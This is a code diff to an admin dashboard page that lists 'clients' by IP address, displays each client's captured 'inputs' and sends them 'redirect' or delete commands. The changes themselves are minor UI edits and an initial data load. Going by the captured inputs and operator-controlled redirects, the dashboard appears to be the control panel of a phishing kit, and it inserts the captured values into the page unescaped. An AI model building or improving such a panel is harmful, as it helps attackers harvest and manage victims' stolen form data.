@@ -29,15 +29,16 @@
       clientList.forEach(client => {
         const clientDiv = document.createElement('div');
         clientDiv.classList.add('client');
+        const inputsHtml = Object.entries(client.inputs).map(([key, value]) => `<p>${key}: ${value}</p>`).join('');
         clientDiv.innerHTML = `
-          <h3>Client: ${client.name || client.clientId} Ip: ${client.ip}</h3>
+          <h3>Client: ${client.clientId} IP: ${client.ip}</h3>
           <button onclick="sendCommand('${client.clientId}', 'redirect1')">Redirect 1</button>
           <button onclick="sendCommand('${client.clientId}', 'redirect2')">Redirect 2</button>
           <button onclick="viewInputs('${client.clientId}')">View Inputs</button>
           <button onclick="deleteClient('${client.clientId}')">Delete</button>
           <div id="inputs-${client.clientId}" class="inputs">
             <h4>Inputs:</h4>
-            ${client.inputs.map(input => `<p>${input.label}: ${input.value}</p>`).join('')}
+            ${inputsHtml}
           </div>
         `;
         clientsDiv.appendChild(clientDiv);
@@ -54,10 +55,11 @@
           body: JSON.stringify({ clientId, command })
         });
         if (!response.ok) {
-          console.error('Failed to send command');
+          alert('Failed to send command');
         }
       } catch (error) {
         console.error('Error sending command:', error);
+        alert('Error sending command');
       }
     }
 
@@ -76,10 +78,11 @@
           body: JSON.stringify({ clientId })
         });
         if (!response.ok) {
-          console.error('Failed to delete client');
+          alert('Failed to delete client');
         }
       } catch (error) {
         console.error('Error deleting client:', error);
+        alert('Error deleting client');
       }
     }
 
@@ -94,6 +97,19 @@
     eventSource.onerror = function(error) {
       console.error('EventSource failed:', error);
     };
+
+    // Load initial clients data if needed
+    async function loadInitialClients() {
+      try {
+        const response = await fetch('/events?admin=true');
+        const data = await response.json();
+        updateClients(data.clientList);
+      } catch (error) {
+        console.error('Error loading initial clients:', error);
+      }
+    }
+
+    loadInitialClients();
   </script>
 </body>
 </html> 
